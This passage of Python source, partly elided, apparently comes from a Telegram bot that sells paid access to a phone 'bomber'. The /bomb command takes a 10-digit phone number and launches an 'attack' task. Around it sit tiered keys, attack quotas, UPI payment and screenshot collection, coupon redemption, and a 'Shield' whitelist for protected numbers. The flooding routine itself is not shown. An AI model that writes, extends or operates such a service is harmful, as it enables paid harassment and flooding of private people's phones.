            await update.message.reply_text(f"✅ <b>Shield!</b> 📱 <code>{text}</code>", parse_mode=ParseMode.HTML, reply_markup=shield_kb())

        elif state == 'WAIT_WL_UPI':
            if '@' not in text or len(text) < 5:
                return await update.message.reply_text("❌ Valid UPI bhejein:")
            ctx.user_data['state'] = None
            cursor.execute("INSERT OR REPLACE INTO whitelist (entry,type,added_by,added_at) VALUES (?,'upi',?,?)",
                           (text, uid, now_ist().strftime('%Y-%m-%d %H:%M:%S')))
            db.commit()
            await update.message.reply_text(f"✅ <b>UPI Shield!</b> 💳 <code>{text}</code>", parse_mode=ParseMode.HTML, reply_markup=shield_kb())

        elif state == 'WAIT_WL_REMOVE':
            ctx.user_data['state'] = None
            cursor.execute("DELETE FROM whitelist WHERE entry=? AND added_by=?", (text, uid))
            if cursor.rowcount > 0:
                db.commit()
                await update.message.reply_text(f"✅ Removed: <code>{text}</code>", parse_mode=ParseMode.HTML, reply_markup=shield_kb())
            else:
                await update.message.reply_text("❌ Entry nahi mili.", reply_markup=shield_kb())

        # KEY MANAGEMENT STATES (admin)
        elif state == 'WAIT_ADM_DELKEY' and uid == ADMIN_ID:
            ctx.user_data['state'] = None
            kc = text.strip().upper()
            cursor.execute("DELETE FROM access_keys WHERE key_code=?", (kc,))
            if cursor.rowcount > 0:
                db.commit()
                await update.message.reply_text(f"✅ Key deleted: <code>{kc}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text("❌ Key nahi mila. /keylist se check karo.")

        elif state == 'WAIT_ADM_KEYSTATUS' and uid == ADMIN_ID:
            ctx.user_data['state'] = None
            try:
                t_uid = int(text.strip())
                sess = get_key_session(t_uid)
                if not sess:
                    await update.message.reply_text(f"❌ UID {t_uid} ka koi active session nahi.")
                else:
                    await update.message.reply_text(
                        f"╔══ 🔑 KEY SESSION ══╗\n{L1}\n"
                        f"👤 UID: <code>{t_uid}</code>\n"
                        f"🗝️ Key: <code>{sess['key_code']}</code>\n"
                        f"💎 Tier: {tb(sess['tier'])}\n"
                        f"⏱️ Remaining: <code>{key_time_remaining(sess['expires_at'])}</code>\n"
                        f"⚔️  Attacks: {sess['total_used']}/{('∞' if sess['max_attacks']==-1 else sess['max_attacks'])}\n"
                        f"📅 Daily: {sess['daily_used']}/{('∞' if sess['daily_limit']==-1 else sess['daily_limit'])}\n"
                        f"╚{'═'*27}╝",
                        parse_mode=ParseMode.HTML)
            except ValueError:
                await update.message.reply_text("❌ Valid UID bhejo.")

        elif state == 'WAIT_ADM_REVOKEKEY' and uid == ADMIN_ID:
            ctx.user_data['state'] = None
            try:
                t_uid = int(text.strip())
                cursor.execute("DELETE FROM user_key_sessions WHERE user_id=?", (t_uid,))
                cursor.execute("UPDATE users SET tier='free', expiry='0' WHERE id=?", (t_uid,))
                db.commit()
                task = active_tasks.pop(t_uid, None)
                if task and not task.done(): task.cancel()
                await update.message.reply_text(f"✅ UID {t_uid} ka session revoked!")
                try:
                    await ctx.bot.send_message(t_uid,
                        f"⚠️ <b>Access Revoked!</b>\n{L1}\nAdmin ne tera key session hataya.\nAdmin: {ADMIN_USERNAME}",
                        parse_mode=ParseMode.HTML)
                except: pass
            except ValueError:
                await update.message.reply_text("❌ Valid UID bhejo.")

        # PAYMENT
        elif state == 'WAIT_PAYMENT_UTR':
            if not text.isdigit() or len(text) < 6:
                return await update.message.reply_text("❌ Valid UTR bhejein (6-12 digits):")
            ctx.user_data['utr_number'] = text
            ctx.user_data['state'] = 'WAIT_PAYMENT_SS'
            await update.message.reply_text(
                f"✅ UTR: <code>{text}</code>\n📸 Ab payment screenshot bhejo:",
                parse_mode=ParseMode.HTML)

        # (Other states like WAIT_BAN, WAIT_UNBAN, etc. are kept but not repeated here for brevity)

    except Exception as e:
        logging.error(f"Text handler [{state}] error: {e}")
        ctx.user_data.clear()
        await update.message.reply_text("❌ Error. /start karein.")

# ══════════════════════════════════════════════════════════════
#                    📸 PHOTO HANDLER (Payment Screenshot)
# ══════════════════════════════════════════════════════════════
async def handle_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = ctx.user_data.get('state')
    if state == 'WAIT_PAYMENT_SS':
        utr  = ctx.user_data.get('utr_number','')
        plan = ctx.user_data.get('buy_plan','')
        amt  = ctx.user_data.get('buy_amount', 0)
        ctx.user_data['state'] = None
        photo_id = update.message.photo[-1].file_id
        now_s = now_ist().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("INSERT INTO payments (user_id,plan,amount,utr,screenshot,status,created_at) VALUES (?,?,?,?,?,'pending',?)",
                       (uid, plan, amt, utr, photo_id, now_s))
        pay_id = cursor.lastrowid; db.commit()
        cursor.execute("SELECT username, first_name FROM users WHERE id=?", (uid,))
        urow = cursor.fetchone()
        uname = urow[0] if urow else 'Unknown'; fname = urow[1] if urow else ''
        tier, _ = await verify_tier(uid)
        await ctx.bot.send_photo(ADMIN_ID, photo=photo_id,
            caption=(
                f"╔══ 💰 PAYMENT + SCREENSHOT ══╗\n{L1}\n"
                f"🆔 Pay ID: <code>#{pay_id}</code>\n"
                f"👤 @{uname} ({fname}) | <code>{uid}</code>\n"
                f"💎 {tb(tier)} | {plan.upper()} | ₹{amt}\n"
                f"🏷️ UTR: <code>{utr}</code>\n{L1}\n"
                f"✅ <code>/approve_pay {pay_id}</code>\n"
                f"❌ <code>/reject_pay {pay_id}</code>\n╚{'═'*27}╝"
            ), parse_mode=ParseMode.HTML)
        await update.message.reply_text(
            f"╔══ ✅ PAYMENT + SS RECEIVED! ══╗\n{L1}\n"
            f"🆔 Pay ID: <code>#{pay_id}</code>\n"
            f"💰 ₹{amt} | UTR: <code>{utr}</code>\n"
            f"📸 Screenshot received!\n{L1}\n"
            f"⏳ 24 hrs mein verify.\n"
            f"Contact: {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════════════════════════
#                    📨 COMMAND HANDLERS
# ══════════════════════════════════════════════════════════════
async def bomb_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    tier, banned = await verify_tier(uid, ctx)
    if banned == 1: return await update.message.reply_text(f"⛔ Suspended. {ADMIN_USERNAME}")
    if is_maint() and uid != ADMIN_ID: return await update.message.reply_text("🔧 Maintenance mode.")
    if get_ram() > RAM_MB * 0.95 and uid != ADMIN_ID:
        return await update.message.reply_text(
            f"╔══ ⚠️ SERVER FULL ══╗\n{L1}\n1-2 min baad try karo.\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    if not ctx.args:
        return await update.message.reply_text("ℹ️ Usage: <code>/bomb 9876543210</code>", parse_mode=ParseMode.HTML)
    target = ctx.args[0].strip()
    if not target.isdigit() or len(target) != 10:
        return await update.message.reply_text("❌ 10-digit number chahiye.", parse_mode=ParseMode.HTML)
    if is_protected(target):
        # simple protected message
        return await update.message.reply_text("⚠️ This number is protected by Shield.", parse_mode=ParseMode.HTML)

    if uid != ADMIN_ID:
        can, reason = key_can_attack(uid)
        if not can:
            return await update.message.reply_text(
                f"╔══ 🔑 ACCESS DENIED ══╗\n{L1}\n"
                f"{reason}\n{L1}\n"
                f"💳 Buy key: /buy\nAdmin: {ADMIN_USERNAME}\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("💳 BUY KEY", callback_data='nav_buy'),
                    InlineKeyboardButton("🔑 ENTER KEY", callback_data='nav_enter_key')]]))
        sess = get_key_session(uid)
        eff_tier = sess['tier'] if sess else tier
    else:
        eff_tier = tier

    if uid in active_tasks:
        return await update.message.reply_text("⚠️ <b>Attack running!</b> 🛑 STOP dabao pehle.", parse_mode=ParseMode.HTML)

    lim   = get_rounds(uid, eff_tier)
    speed = get_speed(eff_tier, uid)
    task  = asyncio.create_task(execute_bomb(update, ctx, target, uid, eff_tier, lim, speed))
    active_tasks[uid] = task
    if uid != ADMIN_ID:
        key_inc_attack(uid)

async def buy_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    upi = gs('upi_id'); upi_name = gs('upi_name')
    txt = (f"╔══ 💎 VIP PLANS — AGS NEXUS ══╗\n{L2}\n"
           f"💸 LOW RANGE:  ₹9 – ₹49   (Trial/Bronze)\n"
           f"⚡ MID RANGE:  ₹50 – ₹299  (Silver/Gold)\n"
           f"💎 HIGH RANGE: ₹350+       (Premium/Elite)\n"
           f"{L1}\n"
           f"💳 <b>UPI:</b> <code>{upi}</code> ({upi_name})\n"
           f"✅ Plan select → UPI pay → Admin verify!\n"
           f"╚{'═'*29}╝")
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=buy_kb())

async def redeem_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not ctx.args: return await update.message.reply_text("🎟️ <code>/redeem CODE</code>", parse_mode=ParseMode.HTML)
    code = ctx.args[0].strip().upper()
    cursor.execute("SELECT tier,days,max_uses,used_count FROM coupons WHERE code=?", (code,))
    res = cursor.fetchone()
    if not res: return await update.message.reply_text("❌ Invalid code.")
    tier_c, days, mu, uc = res
    if uc >= mu: return await update.message.reply_text("❌ Code used up!")
    exp = (now_ist()+timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("UPDATE users SET tier=?,expiry=? WHERE id=?", (tier_c, exp, uid))
    cursor.execute("UPDATE coupons SET used_count=used_count+1 WHERE code=?", (code,))
    if uc+1 >= mu: cursor.execute("DELETE FROM coupons WHERE code=?", (code,))
    db.commit()
    await update.message.reply_text(f"🎉 <b>REDEEMED!</b>\n{tb(tier_c)} | {days} Days\n⚡ /start karein!", parse_mode=ParseMode.HTML)

# (The rest of the command handlers like approve_pay, reject_pay, etc. remain unchanged, but are not repeated here for brevity)

# ══════════════════════════════════════════════════════════════
#                    🚀 MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    # ... (print banner) ...
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    # Register all handlers (same as before but without tool commands)
    # ...
    app.run_polling(drop_pending_updates=True)